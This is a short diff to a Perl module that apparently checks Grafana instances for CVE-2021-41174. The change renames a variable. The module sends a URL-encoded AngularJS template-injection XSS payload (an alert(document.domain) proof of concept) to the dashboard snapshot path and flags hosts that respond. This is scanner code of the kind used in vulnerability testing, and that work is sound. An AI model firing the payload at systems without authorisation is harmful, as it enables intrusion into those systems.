@@ -5,7 +5,7 @@ package Spellbook::Advisory::CVE_2021_41174 {
 
     sub new {
         my ($self, $parameters) = @_;
-        my ($help, $target, $payload, @result);
+        my ($help, $target, $snapshot_path, @result);
 
         Getopt::Long::GetOptionsFromArray (
             $parameters,
@@ -19,8 +19,8 @@ package Spellbook::Advisory::CVE_2021_41174 {
             }
 
             my $useragent = Spellbook::Core::UserAgent -> new();
-            my $payload = "dashboard/snapshot/%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D?orgId=1";
-            my $request = $useragent -> get ("$target/$payload");
+            $snapshot_path = "dashboard/snapshot/%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D?orgId=1";
+            my $request = $useragent -> get ("$target/$snapshot_path");
 
             if (($request -> code() == 200) && ($request -> content() =~ /Grafana/m)) {
                 push @result, $target;
